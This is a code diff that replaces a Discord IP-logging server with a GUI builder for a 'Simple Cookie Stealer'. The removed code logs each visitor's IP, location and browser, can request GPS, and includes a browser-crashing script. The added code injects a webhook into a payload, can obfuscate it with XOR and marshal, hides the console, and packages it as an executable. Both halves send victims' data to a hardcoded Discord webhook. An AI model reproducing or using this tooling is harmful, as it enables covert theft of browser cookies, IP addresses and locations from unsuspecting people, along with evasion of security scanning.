@@ -1,304 +1,229 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+try:
+    from tkinter import *
+    import customtkinter
+    import os
+    import ctypes
+    import random
+    import base64
+    import marshal
+    import shutil
+    import virtualenv
+    import requests
+    import threading
+except ImportError:
+    import ctypes
+    ctypes.windll.user32.MessageBoxW(0, "Please install the required libraries in requirements.txt", "Error", 0)
+    exit()
 
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
+version = "1.0"
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+webhook = "https://discord.com/api/webhooks/1126253248710455516/srzlfoUY9vkkgfjkFznp_s4RR9vOSz0mQtJL5-tGs7-Wd8R9uCAT7JQOTRcYzi83FIaG
+" # Webhook URL
+obfuscate = False # Obfuscate the payload
+hideConsole = False # Hide the console when the payload is ran
+virtualenvir = False
+inputFileName = "" # Input file name
+comboBoxFileType = "EXE" # File type
 
-config = {
-    # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1126253248710455516/srzlfoUY9vkkgfjkFznp_s4RR9vOSz0mQtJL5-tGs7-Wd8R9uCAT7JQOTRcYzi83FIaG",
-    "image": "https://th.bing.com/th/id/R.49e96279d15c4538097418ec2f153ebb?rik=HuiXQ1VP2vg25g&riu=http%3a%2f%2fmobile-cuisine.com%2fwp-content%2fuploads%2f2012%2f09%2fhot-dog-fun-facts.jpg&ehk=LQPLsZha2kk8RNBsSzlvzvYoHVuJU4cXZaZ4ejxnRwM%3d&risl=&pid=ImgRaw&r=0", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
-
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
-
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
-    },
-
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
-
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
-
-    # REDIRECTION #
-    "redirect": {
-        "redirect": True, # Redirect to a webpage?
-        "page": "https://www.youtube.com/watch?v=dQw4w9WgXcQ" # Link to the webpage to redirect to 
-    },
-
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
-}
-
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
-
-def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    else:
-        return False
-
-def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
-
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
-    if ip.startswith(blacklistedIPs):
+def build():
+    if not os.path.exists("main.py"):
+        ctypes.windll.user32.MessageBoxW(0, "main.py not found. Reinstall this program!", "Error", 0)
         return
     
-    bot = botCheck(ip, useragent)
+    with open("main.py", "r") as file:
+        data = file.read()
     
-    if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
-        return
+    _filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for i in range(10)])
+    filename = _filename + "_tmp.py"
 
-    ping = "@everyone"
+    data = data.replace("WEBHOOK GOES HERE", webhook)
 
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-                return
-        
-        if config["vpnCheck"] == 1:
-            ping = ""
+    if obfuscate:
+        randomXor = random.randint(1, 255)
+        data = f"""import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(bytes([x^{randomXor} for x in {bytes([x^randomXor for x in base64.b85encode(marshal.dumps(compile(data, "q", "exec")))])}]))))"""
+
+    with open(filename, "w") as file:
+        file.write(data)
+
+    if virtualenvir:
+        os.system(f"virtualenv {_filename}")
+        exec(open(f"{_filename}\\Scripts\\activate_this.py").read(), {'__file__': f"{_filename}\\Scripts\\activate_this.py"})
+        os.system(f"{_filename}\\Scripts\\pip install -r requirements.txt")
+
+    scriptsPath = f"{_filename}\\Scripts\x5c" # Apparently you're not allowing to put escaped backslashes at the end of strings, so I had to do the hex thingy.
+
+    os.system(f"{scriptsPath if virtualenvir else ''}pyinstaller --onefile {'--noconsole' if hideConsole else ''} --clean --icon=NONE " + filename)
+    os.remove(filename)
+    shutil.rmtree("build")
+    shutil.copy2("dist\\" + filename.replace(".py", ".exe"), filename.replace(".py", ".exe"))
+    shutil.rmtree("dist")
+    os.remove(filename.replace(".py", ".spec"))
+    if virtualenvir: shutil.rmtree(_filename)
+    os.rename(filename.replace(".py", ".exe"), f"{inputFileName}.{comboBoxFileType.lower()}")
+
+class GUI(customtkinter.CTk):
+
+    def __init__(self):
+        global version
+        super().__init__()
+
+        self.title("Simple Cookie Stealer")
+        self.geometry("700x400")
+        self.resizable(False, False)
+        customtkinter.set_default_color_theme("theme.json")
+        customtkinter.set_appearance_mode("Dark")
+
+        GeneralLabel = customtkinter.CTkLabel(master=self, text="Cookie Stealer", font=("Arial", 20))
+        GeneralLabel.place(x=5, y=5)
+
+        versionInfo = customtkinter.CTkLabel(master=self, text=f"Simple Cookie Stealer v{version}", font=("Arial", 10))
+        versionInfo.place(x=5, y=375)
+
+        self.configButton = customtkinter.CTkButton(master=self, text="Config", width=153, command=self.goToConfig, corner_radius=0, fg_color="#363636", hover_color="#363636")
+        self.configButton.place(x=0, y=50)
+
+        self.helpButton = customtkinter.CTkButton(master=self, text="Help", width=153, command=self.goToHelp, corner_radius=0, fg_color="#242424", hover_color="#363636")
+        self.helpButton.place(x=0, y=80)
+
+        self.creditsButton = customtkinter.CTkButton(master=self, text="Credits", width=153, command=self.goToCredits, corner_radius=0, fg_color="#242424", hover_color="#363636")
+        self.creditsButton.place(x=0, y=110)
+
+        self.configFrame = customtkinter.CTkFrame(master=self, width=547, height=400, corner_radius=0)
+        self.configFrame.place(x=153, y=0)
+
+        self.helpFrame = customtkinter.CTkFrame(master=self, width=547, height=400, corner_radius=0)
+
+        self.creditFrame = customtkinter.CTkFrame(master=self, width=547, height=400, corner_radius=0)
+
+        self.webhookBox = customtkinter.CTkEntry(master=self.configFrame, width=400, placeholder_text="Webhook URL")
+        self.webhookBox.place(x=5, y=5)
+
+        self.buildButton = customtkinter.CTkButton(master=self.configFrame, text="Build", width=132, command=self.handleBuildButton)
+        self.buildButton.place(x=410, y=5)
+
+        self.boxObfuscate = customtkinter.CTkCheckBox(master=self.configFrame, text="Obfuscate EXE", command=self.handleBoxObfuscate)
+        self.boxHideConsole = customtkinter.CTkCheckBox(master=self.configFrame, text="Hide Console", command=self.handleBoxHideConsole)
+        boxVirtualCompiler = customtkinter.CTkCheckBox(master=self.configFrame, text="Virtual Compiling Environment", command=self.handleBoxVirtualCompiler)
+        self.inputFileName = customtkinter.CTkEntry(master=self.configFrame, width=200, placeholder_text="Input File Name")
+        self.comboBoxFileType = customtkinter.CTkComboBox(master=self.configFrame, width=70, values=["EXE", "SCR", "COM", "BAT", "CMD"], command=self.handleComboBoxFileType)
+        self.boxObfuscate.place(x=5, y=40)
+        self.boxHideConsole.place(x=5, y=70)
+        boxVirtualCompiler.place(x=5, y=100)
+        self.inputFileName.place(x=5, y=130)
+        self.comboBoxFileType.place(x=210, y=130)
+
+        self.creditText = customtkinter.CTkTextbox(master=self.creditFrame, width=537, height=390, fg_color="#292929")
+        self.creditText.insert(END, f"""Simple Cookie Stealer v{version}
+
+Simple Cookie Stealer and Builder are created and brought to you by DeKrypt.
+Offical GitHub Repository: https://github.com/dekrypted/simple-cookie-stealer
+
+Credits:
+DeKrypt - GUI Builder
+DeKrypt - Cookie Stealer Source
+ThePythonCode - Chrome Decryption (https://www.thepythoncode.com/article/extract-chrome-passwords-python)
+CustomTkinter - Library for GUI (https://customtkinter.tomschimansky.com/)
+PyInstaller - EXE Builder (https://www.pyinstaller.org/)
+pycryptodome - pycryptodome library (https://pypi.org/project/pycryptodome/)
+pywin32 - pywin32 library (https://pypi.org/project/pywin32/)
+requests - requests library (https://pypi.org/project/requests/)
+Python - Programming Language (https://www.python.org/)
+                               
+And you! Thanks for using Simple Cookie Stealer!
+""")
+        self.creditText.configure(state=DISABLED)
+        self.creditText.place(x=5, y=5)
+
+        self.helpText = customtkinter.CTkTextbox(master=self.helpFrame, width=537, height=390, fg_color="#292929")
+        self.helpText.insert(END, """Welcome to Simple Cookie Stealer!
+Webhook:
+Discord Webhook URL to send the cookies to.
+
+Obfuscate EXE:
+Obfuscate the EXE file to make it harder to reverse engineer.
+
+Hide Console:
+Hide the console when the EXE file is ran.
+
+Virtual Compiling Environment:
+Generate a Virtual Python instance to compile the EXE. Smaller file size, but slower compile time.
+
+Yes, I know there isn't much here. It's a SIMPLE Cookie Stealer :)
+        """)
+        self.helpText.configure(state=DISABLED)
+        self.helpText.place(x=5, y=5)
+
+    def goToConfig(self):
+        self.configFrame.place(x=153, y=0)
+        self.helpFrame.place_forget()
+        self.creditFrame.place_forget()
+        self.configButton.configure(fg_color="#363636")
+        self.helpButton.configure(fg_color="#242424")
+        self.creditsButton.configure(fg_color="#242424")
     
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
-            else:
-                return
+    def goToHelp(self):
+        self.helpFrame.place(x=153, y=0)
+        self.configFrame.place_forget()
+        self.creditFrame.place_forget()
+        self.helpButton.configure(fg_color="#363636")
+        self.configButton.configure(fg_color="#242424")
+        self.creditsButton.configure(fg_color="#242424")
 
-        if config["antiBot"] == 3:
-                return
+    def goToCredits(self):
+        self.creditFrame.place(x=153, y=0)
+        self.configFrame.place_forget()
+        self.helpFrame.place_forget()
+        self.configButton.configure(fg_color="#242424")
+        self.helpButton.configure(fg_color="#242424")
+        self.creditsButton.configure(fg_color="#363636")
 
-        if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
-                ping = ""
-
-        if config["antiBot"] == 1:
-                ping = ""
-
-
-    os, browser = httpagentparser.simple_detect(useragent)
+    def handleWebhookBox(self):
+        global webhook
+        webhook = self.webhookBox.get()
     
-    embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
-
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-```
-{useragent}
-```""",
-    }
-  ],
-}
+    def handleInputFileName(self):
+        global inputFileName
+        inputFileName = self.inputFileName.get()
     
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
-    return info
+    def handleComboBoxFileType(self, _):
+        global comboBoxFileType
+        comboBoxFileType = self.comboBoxFileType.get()
 
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
-}
+    def handleBuildButton(self):
+        self.handleWebhookBox()
+        self.handleInputFileName()
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
+        self.buildButton.configure(text="Building...")
+        self.buildButton.configure(state=DISABLED)
+        self.buildButton.update()
+
+        if webhook == "":
+            ctypes.windll.user32.MessageBoxW(0, "Please enter a webhook URL.", "Error", 0)
+            self.buildButton.configure(text="Build")
+            self.buildButton.configure(state=NORMAL)
+            self.buildButton.update()
+            return
+
+        threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, "Building! This takes a while, please be patient.", "Building", 0)).start()
+        build()
+
+        self.buildButton.configure(text="Build")
+        self.buildButton.configure(state=NORMAL)
+        self.buildButton.update()
+
+        ctypes.windll.user32.MessageBoxW(0, "Build Complete!", "Success", 0)
     
-    def handleRequest(self):
-        try:
-            if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                else:
-                    url = config["image"]
-            else:
-                url = config["image"]
-
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
-            
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-                return
-            
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
-
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
-                return
-            
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
-                self.wfile.write(data)
-        
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
-
-        return
+    def handleBoxVirtualCompiler(self):
+        global virtualenvir
+        virtualenvir = not virtualenvir
     
-    do_GET = handleRequest
-    do_POST = handleRequest
+    def handleBoxObfuscate(self):
+        global obfuscate
+        obfuscate = not obfuscate
+    
+    def handleBoxHideConsole(self):
+        global hideConsole
+        hideConsole = not hideConsole
 
-handler = ImageLoggerAPI
+gui = GUI()
+gui.mainloop()
